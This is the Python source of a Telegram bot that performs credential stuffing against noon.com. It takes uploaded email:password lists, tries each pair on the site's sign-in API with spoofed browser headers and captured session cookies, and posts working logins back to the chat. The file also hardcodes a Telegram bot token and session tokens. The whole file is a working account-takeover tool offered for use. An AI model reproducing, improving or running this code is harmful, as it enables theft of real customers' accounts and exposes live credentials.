import requests
import telebot,time
from telebot import types
import os
token = '6543857512:AAH4V91G3f96UletgrOQPMLt8K0b3MwvXx0'
bot=telebot.TeleBot(token,parse_mode="HTML")
@bot.message_handler(commands=["start"])
def start(message):
	bot.reply_to(message,"Send the file now 😇")
@bot.message_handler(content_types=["document"])
def main(message):
	try:
		dd = 0
		live = 0
		ch = 0
		ko = (bot.reply_to(message, "Checking Your Accounts...⌛").message_id)
		ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
		with open("ac.txt", "wb") as w:
			w.write(ee)
		with open("ac.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
		for whis in lino:
			try:
				acc=str(whis)
				acc=acc.split('\n')[0]
				email=acc.split(':')[0]
				psw=acc.split(':')[1]
			except:
				continue
			cookies = {
			    'i18next': 'ar-EG',
			    'nguestv2': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJraWQiOiJiNWVlNmJhMDBiNDg0NmExYjczYWJlM2UyM2U1MGJhOCIsImlhdCI6MTcwMjI5MjI1OCwiZXhwIjoxNzAyMjkyNTU4fQ.d259tcGI6NlfiZmfZ8abBPHbYkYk0LrRe-DcICczAwc',
			    '_nrtnetid': 'nav1.public.eyJzaWQiOiI1NTg2OTQ3OC1hNmYxLTQ5MzctYjFiNC1jNmM3MDkyZWE3NjkiLCJ0aWQiOiJhMGY0M2U5NDEwNTYxYzgyZGQ0NzIyNjE1MDAxZWIxZDg5NjIzNjM3MDJhNzkzNzNhNGM2YWJkN2ZhNjEyYmI2IiwidXNlcklkIjoiYTBhMjE3ZWEtM2M2NC00NTk2LWJhMmMtOTllOWI2YjY5OGNhIiwiaWF0IjoxNzAyMjkyMzQ2fVFOM1ozUmZ6Y0dVYlgycFBjajNnZnozUmUvZTRsK3pCRGJZdzZsWk1UbWZ4dDNLdy8wOWJVREMyNmZIOHoycFFJTDBjNjd1U1JEZGhsL210TUJUZW1kZFZVTTc1Qm9yMG4rTmxqM3IrZC8vVVJTWkFzdTVGTWxoWVRoQW9HNCtFalhSZTJuNm5DR0hVMWg1YjBzMnFES2dLMk5wd1FCWmZOM2xVSGlaTlBQVTkwTVErQk5adlhBaXhaaE0zeDRCemJIMlBXc1Y4RnN2T2hJK3Z1K1psL0pxSVo4WnN0Nll2TGM5ekdNdDZ1TWtTWEJwd01QbjRPM0RjM2s3U0hEME5mUGNqUHN2TmV2cE9obDlEalB2Q1ByYWVERGR6anJmMFJWcTVlQ1ZNV3RhNGpPSm10ZWlLNERyMlQ5VFRTbEI2SHhSa1JzcXlzT3ROSW4ydHBuc3N5L3FyUnVnK3ZaUnNIdE5ldVcycHNURXdmaVF2dXNQcmV6aXZZOTdFZmphTUFsYVdsTUtpOHV0clJuY2plRVRVN0w4TEZLL2Vwb3JEWTJsc2k5TUQ2YmR3Yi9lUk1ucHpNL0dhUitaUE5SakVFK2wxVkh2ZWtVbWV2cGFwZHo5dG9sL2tCZkhLeDJNVTM0eVRYT1p0WW1ONzhBaG8vNFRVcEFiTEp0NUVJNzZz.MQ==',
			    '_nsid': '55869478-a6f1-4937-b1b4-c6c7092ea769',
			    'AKA_A2': 'A',
			    'bm_mi': '6744DDAB9E162EA717B80D85A19A5541~YAAQYX4ZuAEhqUOMAQAA7tqHWBYuomKHS2xfMQrdabdfDywI2YJiroxt9Y7Kyu2pa35t5RSFOMBNbeFvuXnK37JWs2ntPWSlbEYe7bu8y0ArLPiSL3PU1YxCu3CF35a1nLLOZ504YCUmKdiWO8no2Nljxyj5qZdVS4K80yI+q858dRrPYnhHMwlDuJonrqhiJyYMcl/q2M5mxzbt4sAA5BPMZviVdQHIQ/qVUgF4FQszbkt1GPbEuCUbJAXUSldrcCikmj87Os+a/LK11F0v1qB2mM3IyJiF9VkFgFesq/t4HYL54q6mpCx2aIxhlUmwT+g=~1',
			    'nloc': 'ar-eg',
			    'visitor_id': 'c78ee92a-86b9-4bf9-aad2-210a1f64892a',
			    '_etc': 'OzaPXYTuzJKlpZlY',
			    '_gcl_au': '1.1.794511770.1702292360',
			    'x-location-ecom-eg': 'eyJsYXQiOiAzMDA0MTExMTAsICJsbmciOiAzMTI0NDg2OTEsICJhZGRyZXNzX2NvZGUiOiAiZGE5NDcyMDhhMzVmMDFlZTAwNzM3MDU0MmYyMTBkMjUiLCAiYXJlYSI6ICJcdTA2MzRcdTA2MjdcdTA2MzFcdTA2MzkgXHUwNjI3XHUwNjQ0XHUwNjM0XHUwNjRhXHUwNjJlIFx1MDYzMVx1MDY0YVx1MDYyZFx1MDYyN1x1MDY0NiAtIFx1MDYyN1x1MDY0NFx1MDYzNFx1MDY0YVx1MDYyZSBcdTA2MzlcdTA2MjhcdTA2MmYgXHUwNjI3XHUwNjQ0XHUwNjQ0XHUwNjQ3IC0gXHUwNjM5XHUwNjI3XHUwNjI4XHUwNjJmXHUwNjRhXHUwNjQ2IC0gXHUwNjQ1XHUwNjJkXHUwNjI3XHUwNjQxXHUwNjM4XHUwNjI5IFx1MDYyN1x1MDY0NFx1MDY0Mlx1MDYyN1x1MDY0N1x1MDYzMVx1MDYyOVx1MjAyYyAtIDQyODEwMTQifQ',
			    'dceg': '144',
			    'x-available-eg': 'ecom',
			    '_ga': 'GA1.2.94701705.1702292372',
			    '_gid': 'GA1.2.1789117727.1702292372',
			    '_uetsid': '5d7e31b0981411eea89bb9327bd497ab',
			    '_uetvid': '5d7ebc60981411eead5f41b2a31c4c48',
			    '_scid': '694df42f-9a19-4293-8a8d-96353136771a',
			    '_scid_r': '694df42f-9a19-4293-8a8d-96353136771a',
			    '_fbp': 'fb.1.1702292376486.1174831029',
			    '__gads': 'ID=22a9a7a7b5ec549f:T=1702292375:RT=1702292375:S=ALNI_MZK4UGfm3Mys38ZuHvJcHpRx00e4A',
			    '__gpi': 'UID=00000ce5071af56e:T=1702292375:RT=1702292375:S=ALNI_MYyiIqecMZh_gI9aZtvzhUlWxUC0Q',
			    '_tt_enable_cookie': '1',
			    '_ttp': 'VqP4TbKpg_D8Z3aJ3JbxaVEbZ8D',
			    '_clck': '1vmb7in%7C2%7Cfhg%7C0%7C1440',
			    '_natnetidv2': 'eyJhbGciOiJLTVNSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdGlkIjoiYTBmNDNlOTQxMDU2MWM4MmRkNDcyMjYxNTAwMWViMWQ4OTYyMzYzNzAyYTc5MzczYTRjNmFiZDdmYTYxMmJiNiIsInNpZCI6IjU1ODY5NDc4LWE2ZjEtNDkzNy1iMWI0LWM2YzcwOTJlYTc2OSIsInd0aWQiOiI5ZjNjMTAyOC01ZWMzLTQ1NGEtODE1Yi02YzI3ZDZiYWI4MDMiLCJpYXQiOjE3MDIyOTIzODEsImV4cCI6MTcwMjI5MjY4MX0.tzdHklvj3wVsE0cAx_7tPQVlZqoA9xavDvG8DRo4auS8_k54Ups3NM6-y3OAaQNPjxByDitvF2VRt9Bc9gQDsYI2S_UCAkjmQS9tCoYseBWW7uXfr2yfa1mEAsDG9Qcq0xhDHV3CFOUSRGdvjXTxre5QnyOdnnSoZltbjXEuLRlJkHr0RcXkGvh5vNRd0L_msgXzFh1KWllCRX4RcM6HltLoH6crXAufibVdy2uuzEfFI8qX3Y3LD0Ov9gLvO6J8z2EXKQ02sJxK3oOtqDw6eTKVI_OpDraZp3a2dzck1-JWQJ0vQQs88SZFoQODeoqnbglO9KjaympSBOmsifKIrjZpttw3zDKxB5EHThxUHV_5M60MXaf2j9DlfNJIppbBLI0w2jOHvDbBekHkbVUwL1Aqbxf03_tiXgQHzvW_cPWTRKQ7fPnt51V_TdCzjcGUHbBrgN8TGvgUHiD2m1iyAVFdteBZSwjp-KaPzouN6NCnHyVQRJiCERmDhCt15iEg',
			    '_clsk': '1efekqo%7C1702292386642%7C1%7C0%7Ck.clarity.ms%2Fcollect',
			    '_sctr': '1%7C1702245600000',
			    '__zlcmid': '1JGmKypyR8jLtdx',
			
			'_gat_UA-84507530-14': '1',
			    'RT': '"z=1&dm=noon.com&si=fyiazhwvbn&ss=lq0suxi6&sl=2&tt=13xy&rl=1"',
			    'bm_sv': '5BDE7D9BCA622DBF75E1FF6604340968~YAAQYX4ZuBZaqUOMAQAAYFuKWBYht5exM0ZrLA9TPkgqv5CMPrpBQ8fkVzv1ESrIfTWdDZEHfswnPPvPcg8b3y5A4SzDWHPb0Ka8X2EqDKQmXqxjXGyyHySeUJ39PbzNGX6OIPMl1KxBRPBqpsbLTFcoSLLjCH3wc+Z3JL+4NfitJH0B1GVmMZ8FUR1MKWKCntmniAeOrGUM4mV/UQESw68Tb6GSp0qnQcBnAZxG4Q8GLEy5KKeW+ljWYGeObJk=~1',
			    'ak_bmsc': '34A3AEEF15DF3916CEDAF27E5CB60757~000000000000000000000000000000~YAAQYX4ZuEtaqUOMAQAA2lyKWBaSTPEUJ9DcuhfnH+vYVEzb+Dj4LJFcT0ujq0yYY8p036ph3C7ZYL+hC82SXRqRTSYcJb5reFqCavSsrYzBjmtlyiODcnII6pxcRjxBYGWflOUbM9vniGnne3NBREc+SLA3yGbRPdUOK+nbZpcW41Ap7MZtFb5Nu6nqogtKDw1br5zV9wqsyOPZMvH9K2crvd8eAfwfq8745A0eYXd4u4V2HXvMCfp+KCCqV2wZ2SFNuyKDq7vW0cHfe2kv9o4Mrs4iXHgmagM8zw6jCguuSOcbGCUGqmxHkgY0Dhrffm5AtCCmnOQAlT0Lzcx8pWnFQx13p/u8U9MufKYHmXx4oSgq4YPzaZrK0qvGhSpxHoXytOuS8M+7p2f87f5GzGnNVEfw64m147d7GO0uXUbHNS07gyleSnGg/Rk2/nc1d6u2clWmJCHNd8gzVlN9ICrnDvfsFKphYJ+6WTss57TP+JEbILqcmr5krVlNEekCc92fkkiVSSZA5vNCR1uUcJwkc0H4Ug==',
			}
			
			headers = {
			    'authority': 'login.noon.com',
			    'accept': 'application/json, text/plain, */*',
			    'accept-language': 'en-US,en;q=0.9',
			    'cache-control': 'no-cache',
			    'content-type': 'application/json',
			    'origin': 'https://login.noon.com',
			    'referer': 'https://login.noon.com/egypt-ar/',
			    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
			    'sec-ch-ua-mobile': '?0',
			    'sec-ch-ua-platform': '"Windows"',
			    'sec-fetch-dest': 'empty',
			    'sec-fetch-mode': 'cors',
			    'sec-fetch-site': 'same-origin',
			    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
			    'x-locale': 'ar-eg',
			    'x-platform': 'web',
			}
			
			json_data = {
			    'email': email,
			    'password': psw,
			}
			
			response = requests.post('https://login.noon.com/_svc/customer-v1/auth/signin', cookies=cookies, headers=headers, json=json_data)
			
			try:
				ii=response.json()['error']
				dd += 1
			except:
				ii='Successful Login'
				live += 1
				msg=f"𝗚𝗢𝗢𝗗 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 ✅\n𝙴𝙼𝙰𝙸𝙻 : {email}\n𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : {psw}\n𝗕𝗢𝗧 𝗕𝗬 : @THE_S7"
				bot.reply_to(message, msg)
			mes = types.InlineKeyboardMarkup(row_width=1)
			cm1 = types.InlineKeyboardButton(f"• {acc} •", callback_data='u8')
			status = types.InlineKeyboardButton(f"• 𝗦𝗧𝗔𝗧𝗨𝗦 ➜ {ii} •", callback_data='u8')
			cm3 = types.InlineKeyboardButton(f"• 𝗚𝗢𝗢𝗗 𝗔𝗖𝗖𝗢𝗨𝗡𝗧𝗦 ✅ ➜ [ {live} ] •", callback_data='x')
			cm4 = types.InlineKeyboardButton(f"• 𝗗𝗘𝗔𝗗 𝗔𝗖𝗖𝗢𝗨𝗡𝗧𝗦 ❌ ➜ [ {dd} ] •", callback_data='x')
			cm5 = types.InlineKeyboardButton(f"• 𝗧𝗢𝗧𝗔𝗟 👻 ➜ [ {total} ] •", callback_data='x')
			stop=types.InlineKeyboardButton(f"[ 𝐒𝐓𝐎𝐏 ]", callback_data='stop')
			mes.add(cm1,status, cm3, cm4, cm5, stop)
			bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait for processing 
		𝒃𝒚 ➜ @MNOW4 ''', reply_markup=mes)
	except:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''حاول بأستخدام ملف اخر''')
print("تم تشغيل البوت")
bot.polling()